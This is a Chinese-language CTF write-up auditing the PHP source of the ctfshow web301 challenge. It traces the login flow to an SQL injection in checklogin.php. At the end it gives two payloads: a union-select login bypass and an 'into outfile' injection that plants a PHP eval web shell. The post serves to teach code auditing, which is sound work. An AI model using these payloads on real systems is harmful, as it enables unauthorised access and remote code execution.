---
title: "[代码审计]实战篇:web301"
desc: TonyD0g
date: 2022-01-29 22:54:20
tags: 代码审计
---
<font size=4 >

###### [版本0x2] 
###### 2022-01-30

## 前言:
(请多多支持ctfshow,侵删)
审计审计大菜鸡师傅四年前写的代码,正好也让我这个新手练练手.
源码下载:https://ctfshow.lanzoui.com/ilMPgjfeyxa

## 正文:
第一次代码审计,我选择从index.php上入手.

index.php用浏览器打开是这个样子的:
![avatar](https://s4.ax1x.com/2022/01/29/HpzTln.png)

很明显已经进入系统了,现在我们来看代码:
![avatar](https://s4.ax1x.com/2022/01/29/Hpz5Wj.png)

前面的PHP代码在黑盒测试中是不可见的，可见的是下面的HTML代码.

分析一下PHP代码:
```
<?php
session_start();
require "conn.php";
if(!isset($_SESSION['login'])){
header("location:login.php");
}
?>
```
好，我们这里遇到了conn.php文件,我们跟踪一下:
```
<?php

$mysqluser="root";
$mysqlpwd="*******";
$mysqldb="sds";
$mysqlhost="localhost";
$mysqlport="3306";
$mysqli=@new mysqli($mysqlhost,$mysqluser,$mysqlpwd,$mysqldb);
if(mysqli_connect_errno()){
	die(mysqli_connect_error());
}
?>
```

发现是个链接数据库的代码.

所以分析后得:
```
<?php
//开启session
session_start();

//包含conn.php文件,conn.php文件:启用数据库
require "conn.php";

//如果没有登录则重定向到login.php
if(!isset($_SESSION['login'])){
header("location:login.php");
}
?>
```

这里重定向到了login.php文件,跟踪一下:
![avatar](https://s4.ax1x.com/2022/01/29/HpzoSs.png)
login.php调用了checklogin.php,继续跟踪

分析后的结果:
```
<?php
//开启了报错信息，方便审计.(实际应用中不要开启)
error_reporting(0);
session_start();
require 'conn.php';
//一个简单的三元运算符,将用户输入的"userid"和"userpwd"传给各自对应的变量
$_POST['userid']=!empty($_POST['userid'])?$_POST['userid']:"";
$_POST['userpwd']=!empty($_POST['userpwd'])?$_POST['userpwd']:"";
$username=$_POST['userid'];
$userpwd=$_POST['userpwd'];

//SQL查询语句,这里是直接代入查询的，所以有SQL注入漏洞
//SQLMAP跑或者手工

$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
$result=$mysqli->query($sql);
$row=$result->fetch_array(MYSQLI_BOTH);
//判断该用户是否存在,不存在则重新登录
if($result->num_rows<1){
	$_SESSION['error']="1";
	header("location:login.php");
	return;
}
//判断密码是否符合,符合则跳转至主页
if(!strcasecmp($userpwd,$row['sds_password'])){
	$_SESSION['login']=1;
	$result->free();
	$mysqli->close();
	header("location:index.php");
	return;
}
//登录失败
$_SESSION['error']="1";
header("location:login.php");

?>
```

发现在checklogin.php中存在SQL注入:
```
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
```

Payload1:
userid=-1' union select 1%23&userpwd=1

Payload2:
userid=a ' union select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/a.php"%23&userpwd=b

至此,代码审计结束
</font>